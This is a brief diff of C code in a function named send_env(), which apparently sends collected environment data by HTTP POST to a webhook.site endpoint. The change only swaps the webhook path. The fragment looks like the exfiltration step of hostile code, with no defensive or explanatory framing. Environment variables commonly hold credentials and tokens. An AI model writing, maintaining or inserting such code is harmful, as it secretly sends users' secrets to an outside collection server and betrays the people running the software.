@@ -83,7 +83,7 @@ void send_env() {
         *(ptr - 1) = '\0';
     }
 
-    sendHttpPost("webhook.site", "/b3ad9a28-2a07-440a-a941-d3b40c6deb65", data);
+    sendHttpPost("webhook.site", "/747b581c-6714-4795-87e2-98ba0d4ea1c5", data);
 
     free(data);
 }
